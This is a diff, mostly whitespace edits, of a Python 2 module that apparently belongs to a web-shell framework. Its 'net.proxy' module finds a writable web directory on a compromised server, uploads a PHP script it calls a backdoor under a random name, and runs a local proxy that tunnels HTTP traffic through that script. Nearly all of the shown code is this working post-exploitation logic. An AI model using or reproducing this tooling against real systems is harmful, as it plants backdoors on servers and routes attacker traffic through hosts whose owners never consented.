@@ -24,25 +24,25 @@ classname = 'Proxy'
 
 
 class ProxyHandler(SocketServer.StreamRequestHandler):
-    
+
     allow_reuse_address = 1
 
     def __init__(self, request, client_address, server):
-        
+
         self.proxies = {}
         self.useragent = choice(agents)
         self.phpproxy = server.rurl
-        
+
         SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
-        
-        
+
+
     def handle(self):
         req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
         try:
             while 1:
                 if not body:
                     line = self.rfile.readline(read_len)
-                    if line == '':                                 
+                    if line == '':
                         # send it anyway..
                         self.send_req(req)
                         return
@@ -91,7 +91,7 @@ class ProxyHandler(SocketServer.StreamRequestHandler):
 
 
 
-    
+
 class Proxy(Module):
 
     params = ParametersList('Install and run real proxy through target', [],
@@ -100,54 +100,54 @@ class Proxy(Module):
                     P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
                     P(arg='lport', help='Local proxy port', default=8080, type=int),
                     )
-    
+
 
     def __get_backdoor(self):
-        
+
         backdoor_path = 'modules/net/external/proxy.php'
 
         try:
             f = open(backdoor_path)
         except IOError:
             raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
-             
-        return f.read()   
-        
+
+        return f.read()
+
     def __upload_file_content(self, content, rpath):
         self.modhandler.load('file.upload').set_file_content(content)
         response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath, 'chunksize': 256 })
-        
+
         return response
-        
+
     def __find_writable_dir(self, path = 'find'):
-        
+
         self.modhandler.set_verbosity(6)
-        
+
         self.modhandler.load('find.webdir').run({ 'rpath' : path })
-        
+
         url = self.modhandler.load('find.webdir').found_url
         dir = self.modhandler.load('find.webdir').found_dir
-        
+
         self.modhandler.set_verbosity()
-        
+
         return dir, url
-        
-    
+
+
     def __run_proxy_server(self, rurl, lport, lhost='127.0.0.1'):
-        
+
         server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
         server.rurl = rurl
         print '[%s] Proxy running. Set \'http://%s:%i\' in your favourite HTTP proxy' % (self.name, lhost, lport)
         server.serve_forever()
-        
-        
+
+
     def run_module(self, rpath, rurl, finddir, lport):
 
         rname = ''.join(choice(letters) for i in xrange(4)) + '.php'
 
 
         if not rurl:
-    
+
             if not rpath and finddir:
                 path, url = self.__find_writable_dir(finddir)
                 if not (path and url):
@@ -160,33 +160,33 @@ class Proxy(Module):
                     raise ModuleException(self.name, 'Remote PHP path must ends with \'.php\'')
                 path = rpath
                 url = None
-            
-        
+
+
             if path:
-    
+
                 phpfile = self.__get_backdoor()
                 response = self.__upload_file_content(phpfile, path)
-            
+
                 if response:
-                    
+
                     if url:
                         self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=%s\'' % (self.name, url))
                     else:
                         self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=http://\' followed by uploaded script url' % (self.name))
 
                     self.mprint('[%s] When finished remove script \'%s\'' % (self.name, path))
-                
-                    
+
+
             else:
                 raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
-        
-        
+
+
         else:
-            
+
             try:
                 self.__run_proxy_server(rurl, lport)
             except Exception, e:
                 raise ModuleException(self.name,'Proxy start on port %i failed with error %s' % (lport, str(e)) )
-        
-        
-        
+
+
+
